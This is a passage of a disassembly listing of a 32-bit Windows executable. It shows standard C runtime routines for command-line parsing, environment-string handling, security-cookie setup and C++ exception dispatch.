                mov     ecx, [ebp+arg_4]
                mov     al, [esi]
                inc     [ebp+arg_4]
                mov     [ecx], al
                jmp     short loc_417886
; ---------------------------------------------------------------------------

loc_417879:                             ; CODE XREF: sub_41771C+138↑j
                call    sub_41C866
                pop     ecx
                test    eax, eax
                jz      short loc_417886
                inc     esi
                inc     dword ptr [edi]

loc_417886:                             ; CODE XREF: sub_41771C+15B↑j
                                        ; sub_41771C+165↑j
                inc     dword ptr [edi]
                mov     edx, [ebp+arg_4]

loc_41788B:                             ; CODE XREF: sub_41771C+130↑j
                inc     esi
                jmp     loc_4177E7
; ---------------------------------------------------------------------------

loc_417891:                             ; CODE XREF: sub_41771C+11E↑j
                                        ; sub_41771C+128↑j ...
                test    edx, edx
                jz      short loc_41789C
                mov     byte ptr [edx], 0
                inc     edx
                mov     [ebp+arg_4], edx

loc_41789C:                             ; CODE XREF: sub_41771C+177↑j
                inc     dword ptr [edi]
                mov     ecx, [ebp+arg_8]
                jmp     loc_4177B4
; ---------------------------------------------------------------------------

loc_4178A6:                             ; CODE XREF: sub_41771C+9B↑j
                                        ; sub_41771C+B4↑j
                mov     eax, [ebp+arg_0]
                pop     esi
                pop     ebx
                test    eax, eax
                jz      short loc_4178B2
                and     dword ptr [eax], 0

loc_4178B2:                             ; CODE XREF: sub_41771C+191↑j
                inc     dword ptr [ecx]
                leave
                retn
sub_41771C      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4178B6      proc near               ; CODE XREF: start-A8↑p

var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 0Ch
                push    ebx
                xor     ebx, ebx
                push    esi
                push    edi
                cmp     dword_42DB34, ebx
                jnz     short loc_4178D0
                call    sub_411DBE

loc_4178D0:                             ; CODE XREF: sub_4178B6+13↑j
                push    104h            ; nSize
                mov     esi, offset byte_42B320
                push    esi             ; lpFilename
                push    ebx             ; hModule
                mov     byte_42B424, bl
                call    ds:GetModuleFileNameA
                mov     eax, dword_42DB3C
                mov     dword_42AE78, esi
                cmp     eax, ebx
                jz      short loc_4178FE
                mov     [ebp+var_4], eax
                cmp     [eax], bl
                jnz     short loc_417901

loc_4178FE:                             ; CODE XREF: sub_4178B6+3F↑j
                mov     [ebp+var_4], esi

loc_417901:                             ; CODE XREF: sub_4178B6+46↑j
                mov     edx, [ebp+var_4]
                lea     eax, [ebp+var_8]
                push    eax
                push    ebx
                push    ebx
                lea     edi, [ebp+var_C]
                call    sub_41771C
                mov     eax, [ebp+var_8]
                add     esp, 0Ch
                cmp     eax, 3FFFFFFFh
                jnb     short loc_417969
                mov     ecx, [ebp+var_C]
                cmp     ecx, 0FFFFFFFFh
                jnb     short loc_417969
                mov     edi, eax
                shl     edi, 2
                lea     eax, [edi+ecx]
                cmp     eax, ecx
                jb      short loc_417969
                push    eax
                call    sub_412BB3
                mov     esi, eax
                pop     ecx
                cmp     esi, ebx
                jz      short loc_417969
                mov     edx, [ebp+var_4]
                lea     eax, [ebp+var_8]
                push    eax
                add     edi, esi
                push    edi
                push    esi
                lea     edi, [ebp+var_C]
                call    sub_41771C
                mov     eax, [ebp+var_8]
                add     esp, 0Ch
                dec     eax
                mov     dword_42AE5C, eax
                mov     dword_42AE60, esi
                xor     eax, eax
                jmp     short loc_41796C
; ---------------------------------------------------------------------------

loc_417969:                             ; CODE XREF: sub_4178B6+67↑j
                                        ; sub_4178B6+6F↑j ...
                or      eax, 0FFFFFFFFh

loc_41796C:                             ; CODE XREF: sub_4178B6+B1↑j
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
sub_4178B6      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_417971      proc near               ; CODE XREF: start-B2↑p

cchWideChar     = dword ptr -0Ch
cbMultiByte     = dword ptr -8
lpMem           = dword ptr -4

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, dword_42B428
                sub     esp, 0Ch
                push    ebx
                push    esi
                mov     esi, ds:GetEnvironmentStringsW
                push    edi
                xor     ebx, ebx
                xor     edi, edi
                cmp     eax, ebx
                jnz     short loc_4179BD
                call    esi ; GetEnvironmentStringsW
                mov     edi, eax
                cmp     edi, ebx
                jz      short loc_4179A3
                mov     dword_42B428, 1
                jmp     short loc_4179C6
; ---------------------------------------------------------------------------

loc_4179A3:                             ; CODE XREF: sub_417971+24↑j
                call    ds:GetLastError
                cmp     eax, 78h
                jnz     short loc_4179B8
                push    2
                pop     eax
                mov     dword_42B428, eax
                jmp     short loc_4179BD
; ---------------------------------------------------------------------------

loc_4179B8:                             ; CODE XREF: sub_417971+3B↑j
                mov     eax, dword_42B428

loc_4179BD:                             ; CODE XREF: sub_417971+1C↑j
                                        ; sub_417971+45↑j
                cmp     eax, 1
                jnz     loc_417A47

loc_4179C6:                             ; CODE XREF: sub_417971+30↑j
                cmp     edi, ebx
                jnz     short loc_4179D9
                call    esi ; GetEnvironmentStringsW
                mov     edi, eax
                cmp     edi, ebx
                jnz     short loc_4179D9

loc_4179D2:                             ; CODE XREF: sub_417971+DD↓j
                                        ; sub_417971+E9↓j ...
                xor     eax, eax
                jmp     loc_417AA3
; ---------------------------------------------------------------------------

loc_4179D9:                             ; CODE XREF: sub_417971+57↑j
                                        ; sub_417971+5F↑j
                mov     eax, edi
                cmp     [edi], bx
                jz      short loc_4179EE

loc_4179E0:                             ; CODE XREF: sub_417971+74↓j
                                        ; sub_417971+7B↓j
                inc     eax
                inc     eax
                cmp     [eax], bx
                jnz     short loc_4179E0
                inc     eax
                inc     eax
                cmp     [eax], bx
                jnz     short loc_4179E0

loc_4179EE:                             ; CODE XREF: sub_417971+6D↑j
                mov     esi, ds:WideCharToMultiByte
                push    ebx             ; lpUsedDefaultChar
                push    ebx             ; lpDefaultChar
                push    ebx             ; cbMultiByte
                sub     eax, edi
                push    ebx             ; lpMultiByteStr
                sar     eax, 1
                inc     eax
                push    eax             ; cchWideChar
                push    edi             ; lpWideCharStr
                push    ebx             ; dwFlags
                push    ebx             ; CodePage
                mov     [ebp+cchWideChar], eax
                call    esi ; WideCharToMultiByte
                mov     [ebp+cbMultiByte], eax
                cmp     eax, ebx
                jz      short loc_417A3C
                push    eax
                call    sub_412BB3
                pop     ecx
                mov     [ebp+lpMem], eax
                cmp     eax, ebx
                jz      short loc_417A3C
                push    ebx             ; lpUsedDefaultChar
                push    ebx             ; lpDefaultChar
                push    [ebp+cbMultiByte] ; cbMultiByte
                push    eax             ; lpMultiByteStr
                push    [ebp+cchWideChar] ; cchWideChar
                push    edi             ; lpWideCharStr
                push    ebx             ; dwFlags
                push    ebx             ; CodePage
                call    esi ; WideCharToMultiByte
                test    eax, eax
                jnz     short loc_417A39
                push    [ebp+lpMem]     ; lpMem
                call    sub_40FD55
                pop     ecx
                mov     [ebp+lpMem], ebx

loc_417A39:                             ; CODE XREF: sub_417971+BA↑j
                mov     ebx, [ebp+lpMem]

loc_417A3C:                             ; CODE XREF: sub_417971+9A↑j
                                        ; sub_417971+A8↑j
                push    edi             ; LPWCH
                call    ds:FreeEnvironmentStringsW
                mov     eax, ebx
                jmp     short loc_417AA3
; ---------------------------------------------------------------------------

loc_417A47:                             ; CODE XREF: sub_417971+4F↑j
                cmp     eax, 2
                jz      short loc_417A50
                cmp     eax, ebx
                jnz     short loc_4179D2

loc_417A50:                             ; CODE XREF: sub_417971+D9↑j
                call    ds:GetEnvironmentStrings
                mov     esi, eax
                cmp     esi, ebx
                jz      loc_4179D2
                cmp     [esi], bl
                jz      short loc_417A6E

loc_417A64:                             ; CODE XREF: sub_417971+F6↓j
                                        ; sub_417971+FB↓j
                inc     eax
                cmp     [eax], bl
                jnz     short loc_417A64
                inc     eax
                cmp     [eax], bl
                jnz     short loc_417A64

loc_417A6E:                             ; CODE XREF: sub_417971+F1↑j
                sub     eax, esi
                inc     eax
                push    eax
                mov     [ebp+cbMultiByte], eax
                call    sub_412BB3
                mov     edi, eax
                pop     ecx
                cmp     edi, ebx
                jnz     short loc_417A8D
                push    esi             ; LPCH
                call    ds:FreeEnvironmentStringsA
                jmp     loc_4179D2
; ---------------------------------------------------------------------------

loc_417A8D:                             ; CODE XREF: sub_417971+10E↑j
                push    [ebp+cbMultiByte]
                push    esi
                push    edi
                call    sub_414550
                add     esp, 0Ch
                push    esi             ; LPCH
                call    ds:FreeEnvironmentStringsA
                mov     eax, edi

loc_417AA3:                             ; CODE XREF: sub_417971+63↑j
                                        ; sub_417971+D4↑j
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
sub_417971      endp


; =============== S U B R O U T I N E =======================================


sub_417AA8      proc near               ; CODE XREF: start:loc_4101BB↑p
                mov     edi, edi
                push    esi
                mov     eax, offset unk_422BCC
                mov     esi, offset unk_422BCC
                push    edi
                mov     edi, eax
                cmp     eax, esi
                jnb     short loc_417ACB

loc_417ABC:                             ; CODE XREF: sub_417AA8+21↓j
                mov     eax, [edi]
                test    eax, eax
                jz      short loc_417AC4
                call    eax

loc_417AC4:                             ; CODE XREF: sub_417AA8+18↑j
                add     edi, 4
                cmp     edi, esi
                jb      short loc_417ABC

loc_417ACB:                             ; CODE XREF: sub_417AA8+12↑j
                pop     edi
                pop     esi
                retn
sub_417AA8      endp

; ---------------------------------------------------------------------------
byte_417ACE     db 8Bh, 0FFh            ; DATA XREF: sub_412E24+41↑o
; ---------------------------------------------------------------------------
                push    esi
                mov     eax, offset unk_422BD4
                mov     esi, offset unk_422BD4
                push    edi
                mov     edi, eax
                cmp     eax, esi
                jnb     short loc_417AF1

loc_417AE2:                             ; CODE XREF: .text:00417AEF↓j
                mov     eax, [edi]
                test    eax, eax
                jz      short loc_417AEA
                call    eax

loc_417AEA:                             ; CODE XREF: .text:00417AE6↑j
                add     edi, 4
                cmp     edi, esi
                jb      short loc_417AE2

loc_417AF1:                             ; CODE XREF: .text:00417AE0↑j
                pop     edi
                pop     esi
                retn

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_417AF4      proc near               ; CODE XREF: start↑p

PerformanceCount= LARGE_INTEGER ptr -10h
SystemTimeAsFileTime= _FILETIME ptr -8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                mov     eax, ___security_cookie
                and     [ebp+SystemTimeAsFileTime.dwLowDateTime], 0
                and     [ebp+SystemTimeAsFileTime.dwHighDateTime], 0
                push    ebx
                push    edi
                mov     edi, 0BB40E64Eh
                mov     ebx, 0FFFF0000h
                cmp     eax, edi
                jz      short loc_417B26
                test    ebx, eax
                jz      short loc_417B26
                not     eax
                mov     dword_425044, eax
                jmp     short loc_417B86
; ---------------------------------------------------------------------------

loc_417B26:                             ; CODE XREF: sub_417AF4+23↑j
                                        ; sub_417AF4+27↑j
                push    esi
                lea     eax, [ebp+SystemTimeAsFileTime]
                push    eax             ; lpSystemTimeAsFileTime
                call    ds:GetSystemTimeAsFileTime
                mov     esi, [ebp+SystemTimeAsFileTime.dwHighDateTime]
                xor     esi, [ebp+SystemTimeAsFileTime.dwLowDateTime]
                call    ds:GetCurrentProcessId
                xor     esi, eax
                call    ds:GetCurrentThreadId
                xor     esi, eax
                call    ds:GetTickCount
                xor     esi, eax
                lea     eax, [ebp+PerformanceCount]
                push    eax             ; lpPerformanceCount
                call    ds:QueryPerformanceCounter
                mov     eax, dword ptr [ebp+PerformanceCount+4]
                xor     eax, dword ptr [ebp+PerformanceCount]
                xor     esi, eax
                cmp     esi, edi
                jnz     short loc_417B6C
                mov     esi, 0BB40E64Fh
                jmp     short loc_417B77
; ---------------------------------------------------------------------------

loc_417B6C:                             ; CODE XREF: sub_417AF4+6F↑j
                test    ebx, esi
                jnz     short loc_417B77
                mov     eax, esi
                shl     eax, 10h
                or      esi, eax

loc_417B77:                             ; CODE XREF: sub_417AF4+76↑j
                                        ; sub_417AF4+7A↑j
                mov     ___security_cookie, esi
                not     esi
                mov     dword_425044, esi
                pop     esi

loc_417B86:                             ; CODE XREF: sub_417AF4+30↑j
                pop     edi
                pop     ebx
                leave
                retn
sub_417AF4      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_417B8A      proc near               ; CODE XREF: sub_4183F9+155↓p

arg_0           = byte ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                lea     eax, [ebp+arg_0]
                push    eax
                mov     esi, ecx
                call    sub_40E649
                mov     dword ptr [esi], offset off_420AFC
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    4
sub_417B8A      endp


; =============== S U B R O U T I N E =======================================


sub_417BA8      proc near               ; DATA XREF: .rdata:00423130↓o
                mov     dword ptr [ecx], offset off_420AFC
                jmp     sub_40E716
sub_417BA8      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_417BB3      proc near               ; DATA XREF: .rdata:off_420AFC↓o

arg_0           = byte ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                mov     dword ptr [esi], offset off_420AFC
                call    sub_40E716
                test    [ebp+arg_0], 1
                jz      short loc_417BD3
                push    esi
                call    sub_40F15B
                pop     ecx

loc_417BD3:                             ; CODE XREF: sub_417BB3+17↑j
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    4
sub_417BB3      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_417BDA      proc near               ; CODE XREF: sub_417E26+50↓p
                                        ; sub_4183F9+20B↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                push    edi
                mov     edi, [ebp+arg_0]
                mov     eax, [edi+4]
                test    eax, eax
                jz      short loc_417C32
                lea     edx, [eax+8]
                cmp     byte ptr [edx], 0
                jz      short loc_417C32
                mov     esi, [ebp+arg_4]
                mov     ecx, [esi+4]
                cmp     eax, ecx
                jz      short loc_417C11
                add     ecx, 8
                push    ecx
                push    edx
                call    sub_415E90
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_417C11

loc_417C0D:                             ; CODE XREF: sub_417BDA+3F↓j
                                        ; sub_417BDA+4D↓j ...
                xor     eax, eax
                jmp     short loc_417C35
; ---------------------------------------------------------------------------

loc_417C11:                             ; CODE XREF: sub_417BDA+21↑j
                                        ; sub_417BDA+31↑j
                test    byte ptr [esi], 2
                jz      short loc_417C1B
                test    byte ptr [edi], 8
                jz      short loc_417C0D

loc_417C1B:                             ; CODE XREF: sub_417BDA+3A↑j
                mov     eax, [ebp+arg_8]
                mov     eax, [eax]
                test    al, 1
                jz      short loc_417C29
                test    byte ptr [edi], 1
                jz      short loc_417C0D

loc_417C29:                             ; CODE XREF: sub_417BDA+48↑j
                test    al, 2
                jz      short loc_417C32
                test    byte ptr [edi], 2
                jz      short loc_417C0D

loc_417C32:                             ; CODE XREF: sub_417BDA+F↑j
                                        ; sub_417BDA+17↑j ...
                xor     eax, eax
                inc     eax

loc_417C35:                             ; CODE XREF: sub_417BDA+35↑j
                pop     edi
                pop     esi
                pop     ebp
                retn
sub_417BDA      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_417C39      proc near               ; CODE XREF: sub_417C82+85↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     eax, [eax]
                mov     eax, [eax]
                cmp     eax, 0E0434F4Dh
                jz      short loc_417C64
                cmp     eax, 0E06D7363h
                jnz     short loc_417C7E
                call    sub_412405
                and     dword ptr [eax+90h], 0
                jmp     sub_418843
; ---------------------------------------------------------------------------

loc_417C64:                             ; CODE XREF: sub_417C39+11↑j
                call    sub_412405
                cmp     dword ptr [eax+90h], 0
                jle     short loc_417C7E
                call    sub_412405
                add     eax, 90h
                dec     dword ptr [eax]

loc_417C7E:                             ; CODE XREF: sub_417C39+18↑j
                                        ; sub_417C39+37↑j
                xor     eax, eax
                pop     ebp
                retn
sub_417C39      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_417C82      proc near               ; CODE XREF: sub_417EEA+EC↓p
                                        ; sub_418297+38↓p ...

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                push    10h
                push    offset stru_423028
                call    __SEH_prolog4
                mov     edi, [ebp+arg_8]
                mov     ebx, [ebp+arg_0]
                cmp     dword ptr [edi+4], 80h
                jg      short loc_417CA3
                movsx   esi, byte ptr [ebx+8]
                jmp     short loc_417CA6
; ---------------------------------------------------------------------------

loc_417CA3:                             ; CODE XREF: sub_417C82+19↑j
                mov     esi, [ebx+8]

loc_417CA6:                             ; CODE XREF: sub_417C82+1F↑j
                mov     [ebp+var_1C], esi
                call    sub_412405
                add     eax, 90h
                inc     dword ptr [eax]
                and     [ebp+ms_exc.registration.TryLevel], 0

loc_417CB9:                             ; CODE XREF: sub_417C82+9F↓j
                cmp     esi, [ebp+arg_C]
                jz      short loc_417D23
                cmp     esi, 0FFFFFFFFh
                jle     short loc_417CC8
                cmp     esi, [edi+4]
                jl      short loc_417CCD

loc_417CC8:                             ; CODE XREF: sub_417C82+3F↑j
                call    sub_41888F
; ---------------------------------------------------------------------------

loc_417CCD:                             ; CODE XREF: sub_417C82+44↑j
                mov     eax, esi
                shl     eax, 3
                mov     ecx, [edi+8]
                add     ecx, eax
                mov     esi, [ecx]
                mov     [ebp+var_20], esi
                mov     [ebp+ms_exc.registration.TryLevel], 1
                cmp     dword ptr [ecx+4], 0
                jz      short loc_417CFE
                mov     [ebx+8], esi
                push    103h
                push    ebx
                mov     ecx, [edi+8]
                push    dword ptr [ecx+eax+4]
                call    sub_4188E0

loc_417CFE:                             ; CODE XREF: sub_417C82+65↑j
                and     [ebp+ms_exc.registration.TryLevel], 0
                jmp     short loc_417D1E
; ---------------------------------------------------------------------------

loc_417D04:                             ; DATA XREF: .rdata:stru_423028↓o
                push    [ebp+ms_exc.exc_ptr]
                call    sub_417C39
                pop     ecx
                retn
; ---------------------------------------------------------------------------

loc_417D0E:                             ; DATA XREF: .rdata:stru_423028↓o
                mov     esp, [ebp+ms_exc.old_esp]
                and     [ebp+ms_exc.registration.TryLevel], 0
                mov     edi, [ebp+arg_8]
                mov     ebx, [ebp+arg_0]
                mov     esi, [ebp+var_20]

loc_417D1E:                             ; CODE XREF: sub_417C82+80↑j
                mov     [ebp+var_1C], esi
                jmp     short loc_417CB9
; ---------------------------------------------------------------------------

loc_417D23:                             ; CODE XREF: sub_417C82+3A↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_417D48
; ---------------------------------------------------------------------------

loc_417D2F:                             ; CODE XREF: sub_417C82:loc_417D62↓j
                cmp     esi, [ebp+arg_C]
                jz      short loc_417D39
                call    sub_41888F
; ---------------------------------------------------------------------------

loc_417D39:                             ; CODE XREF: sub_417C82+B0↑j
                mov     [ebx+8], esi
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_417D42:                             ; DATA XREF: .rdata:stru_423028↓o
                mov     ebx, [ebp+arg_0]
                mov     esi, [ebp+var_1C]

loc_417D48:                             ; CODE XREF: sub_417C82+A8↑j
                call    sub_412405
                cmp     dword ptr [eax+90h], 0
                jle     short loc_417D62
                call    sub_412405
                add     eax, 90h
                dec     dword ptr [eax]

loc_417D62:                             ; CODE XREF: sub_417C82+D2↑j
                retn
sub_417C82      endp


; =============== S U B R O U T I N E =======================================


sub_417D63      proc near               ; CODE XREF: sub_417EEA+93↓p
                mov     eax, [eax]
                cmp     dword ptr [eax], 0E06D7363h
                jnz     short loc_417DA5
                cmp     dword ptr [eax+10h], 3
                jnz     short loc_417DA5
                mov     ecx, [eax+14h]
                cmp     ecx, 19930520h
                jz      short loc_417D8E
                cmp     ecx, 19930521h
                jz      short loc_417D8E
                cmp     ecx, 19930522h
                jnz     short loc_417DA5

loc_417D8E:                             ; CODE XREF: sub_417D63+19↑j
                                        ; sub_417D63+21↑j
                cmp     dword ptr [eax+1Ch], 0
                jnz     short loc_417DA5
                call    sub_412405
                xor     ecx, ecx
                inc     ecx
                mov     [eax+20Ch], ecx
                mov     eax, ecx
                retn
; ---------------------------------------------------------------------------

loc_417DA5:                             ; CODE XREF: sub_417D63+8↑j
                                        ; sub_417D63+E↑j ...
                xor     eax, eax
                retn
sub_417D63      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_417DA8      proc near               ; CODE XREF: SEH_4132F0+10A↑p
                                        ; sub_417EEA+194↓p ...

ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8
arg_4           = byte ptr  0Ch

                push    8
                push    offset stru_423050
                call    __SEH_prolog4
                mov     ecx, [ebp+arg_0]
                test    ecx, ecx
                jz      short loc_417DE5
                cmp     dword ptr [ecx], 0E06D7363h
                jnz     short loc_417DE5
                mov     eax, [ecx+1Ch]
                test    eax, eax
                jz      short loc_417DE5
                mov     eax, [eax+4]
                test    eax, eax
                jz      short loc_417DE5
                and     [ebp+ms_exc.registration.TryLevel], 0
                push    eax
                push    dword ptr [ecx+18h]
                call    sub_4103A9
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh

loc_417DE5:                             ; CODE XREF: sub_417DA8+11↑j
                                        ; sub_417DA8+19↑j ...
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_417DEB:                             ; DATA XREF: .rdata:stru_423050↓o
                xor     eax, eax
                cmp     [ebp+arg_4], al
                setnz   al
                retn
; ---------------------------------------------------------------------------

loc_417DF4:                             ; DATA XREF: .rdata:stru_423050↓o
                mov     esp, [ebp+ms_exc.old_esp]
                call    sub_418843
sub_417DA8      endp

; ---------------------------------------------------------------------------
                db 0CCh

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_417DFD      proc near               ; CODE XREF: sub_418086+86↓p
                                        ; sub_418086+113↓p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_4]
                mov     eax, [ecx]
                push    esi
                mov     esi, [ebp+arg_0]
                add     eax, esi
                cmp     dword ptr [ecx+4], 0
                jl      short loc_417E23
                mov     edx, [ecx+4]
                mov     ecx, [ecx+8]
                mov     esi, [edx+esi]
                mov     ecx, [esi+ecx]
                add     ecx, edx
                add     eax, ecx

loc_417E23:                             ; CODE XREF: sub_417DFD+14↑j
                pop     esi
                pop     ebp
                retn
sub_417DFD      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_417E26      proc near               ; CODE XREF: sub_4183F9+10F↓p
                                        ; sub_4183F9+29F↓p

var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_1           = byte ptr -1
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 0Ch
                test    edi, edi
                jnz     short loc_417E3C
                call    sub_41888F
; ---------------------------------------------------------------------------
                call    sub_418843
; ---------------------------------------------------------------------------

loc_417E3C:                             ; CODE XREF: sub_417E26+A↑j
                and     [ebp+var_8], 0
                cmp     dword ptr [edi], 0
                mov     [ebp+var_1], 0
                jle     short loc_417E9C
                push    ebx
                push    esi

loc_417E4B:                             ; CODE XREF: sub_417E26+72↓j
                mov     eax, [ebp+arg_0]
                mov     eax, [eax+1Ch]
                mov     eax, [eax+0Ch]
                mov     ebx, [eax]
                lea     esi, [eax+4]
                test    ebx, ebx
                jle     short loc_417E90
                mov     eax, [ebp+var_8]
                shl     eax, 4
                mov     [ebp+var_C], eax

loc_417E66:                             ; CODE XREF: sub_417E26+62↓j
                mov     ecx, [ebp+arg_0]
                push    dword ptr [ecx+1Ch]
                mov     eax, [esi]
                push    eax
                mov     eax, [edi+4]
                add     eax, [ebp+var_C]
                push    eax
                call    sub_417BDA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_417E8C
                dec     ebx
                add     esi, 4
                test    ebx, ebx
                jg      short loc_417E66
                jmp     short loc_417E90
; ---------------------------------------------------------------------------

loc_417E8C:                             ; CODE XREF: sub_417E26+5A↑j
                mov     [ebp+var_1], 1

loc_417E90:                             ; CODE XREF: sub_417E26+35↑j
                                        ; sub_417E26+64↑j
                inc     [ebp+var_8]
                mov     eax, [ebp+var_8]
                cmp     eax, [edi]
                jl      short loc_417E4B
                pop     esi
                pop     ebx

loc_417E9C:                             ; CODE XREF: sub_417E26+21↑j
                mov     al, [ebp+var_1]
                leave
                retn
sub_417E26      endp


; =============== S U B R O U T I N E =======================================

; Attributes: noreturn bp-based frame

sub_417EA1      proc near               ; CODE XREF: sub_4183F9+2FB↓p

var_4           = dword ptr -4
arg_4           = dword ptr  0Ch

; FUNCTION CHUNK AT 0041E683 SIZE 0000001B BYTES

                push    4
                mov     eax, offset loc_41E683
                call    __EH_prolog3_catch
                call    sub_412405
                cmp     dword ptr [eax+94h], 0
                jz      short loc_417EC0
                call    sub_41888F
; ---------------------------------------------------------------------------

loc_417EC0:                             ; CODE XREF: sub_417EA1+18↑j
                and     [ebp+var_4], 0
                call    sub_41887C
sub_417EA1      endp

; ---------------------------------------------------------------------------
                or      dword ptr [ebp-4], 0FFFFFFFFh
                call    sub_418843

; =============== S U B R O U T I N E =======================================

; Attributes: noreturn

sub_417ED2      proc near               ; DATA XREF: .rdata:stru_42306C↓o
                call    sub_412405
                mov     ecx, [ebp+8]
                push    0
                push    0
                mov     [eax+94h], ecx
                call    sub_41032B
                int     3               ; Trap to Debugger
sub_417ED2      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_417EEA      proc near               ; CODE XREF: sub_418297+59↓p

var_3C          = byte ptr -3Ch
var_34          = dword ptr -34h
var_30          = dword ptr -30h
var_2C          = dword ptr -2Ch
var_28          = dword ptr -28h
var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h
arg_14          = dword ptr  1Ch

                push    2Ch
                push    offset stru_4230C8
                call    __SEH_prolog4
                mov     ebx, ecx
                mov     edi, [ebp+arg_4]
                mov     esi, [ebp+arg_0]
                mov     [ebp+var_1C], ebx
                and     [ebp+var_34], 0
                mov     eax, [edi-4]
                mov     [ebp+var_24], eax
                push    dword ptr [esi+18h]
                lea     eax, [ebp+var_3C]
                push    eax
                call    sub_410658
                pop     ecx
                pop     ecx
                mov     [ebp+var_28], eax
                call    sub_412405
                mov     eax, [eax+88h]
                mov     [ebp+var_2C], eax
                call    sub_412405
                mov     eax, [eax+8Ch]
                mov     [ebp+var_30], eax
                call    sub_412405
                mov     [eax+88h], esi
                call    sub_412405
                mov     ecx, [ebp+arg_8]
                mov     [eax+8Ch], ecx
                and     [ebp+ms_exc.registration.TryLevel], 0
                xor     eax, eax
                inc     eax
                mov     [ebp+arg_8], eax
                mov     [ebp+ms_exc.registration.TryLevel], eax
                push    [ebp+arg_14]
                push    [ebp+arg_10]
                push    ebx
                push    [ebp+arg_C]
                push    edi
                call    sub_4106FD
                add     esp, 14h
                mov     [ebp+var_1C], eax
                and     [ebp+ms_exc.registration.TryLevel], 0
                jmp     short loc_417FE9
; ---------------------------------------------------------------------------

loc_417F7A:                             ; DATA XREF: .rdata:stru_4230C8↓o
                mov     eax, [ebp+ms_exc.exc_ptr]
                call    sub_417D63
                retn
; ---------------------------------------------------------------------------

loc_417F83:                             ; DATA XREF: .rdata:stru_4230C8↓o
                mov     esp, [ebp+ms_exc.old_esp]
                call    sub_412405
                and     dword ptr [eax+20Ch], 0
                mov     esi, [ebp+arg_C]
                mov     edi, [ebp+arg_4]
                cmp     dword ptr [esi+4], 80h
                jg      short loc_417FA7
                movsx   ecx, byte ptr [edi+8]
                jmp     short loc_417FAA
; ---------------------------------------------------------------------------

loc_417FA7:                             ; CODE XREF: sub_417EEA+B5↑j
                mov     ecx, [edi+8]

loc_417FAA:                             ; CODE XREF: sub_417EEA+BB↑j
                mov     ebx, [esi+10h]
                and     [ebp+var_20], 0

loc_417FB1:                             ; CODE XREF: sub_417EEA+11E↓j
                mov     eax, [ebp+var_20]
                cmp     eax, [esi+0Ch]
                jnb     short loc_417FD1
                imul    eax, 14h
                add     eax, ebx
                mov     edx, [eax+4]
                cmp     ecx, edx
                jle     short loc_418005
                cmp     ecx, [eax+8]
                jg      short loc_418005
                mov     eax, [esi+8]
                mov     ecx, [eax+edx*8+8]

loc_417FD1:                             ; CODE XREF: sub_417EEA+CD↑j
                push    ecx
                push    esi
                push    0
                push    edi
                call    sub_417C82
                add     esp, 10h
                and     [ebp+var_1C], 0
                and     [ebp+ms_exc.registration.TryLevel], 0
                mov     esi, [ebp+arg_0]

loc_417FE9:                             ; CODE XREF: sub_417EEA+8E↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                mov     [ebp+arg_8], 0
                call    loc_418010
; ---------------------------------------------------------------------------

loc_417FFC:                             ; CODE XREF: sub_417EEA:loc_418085↓j
                mov     eax, [ebp+var_1C]
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_418005:                             ; CODE XREF: sub_417EEA+D9↑j
                                        ; sub_417EEA+DE↑j
                inc     [ebp+var_20]
                jmp     short loc_417FB1
; ---------------------------------------------------------------------------

loc_41800A:                             ; DATA XREF: .rdata:stru_4230C8↓o
                mov     edi, [ebp+arg_4]
                mov     esi, [ebp+arg_0]

loc_418010:                             ; CODE XREF: sub_417EEA+10D↑j
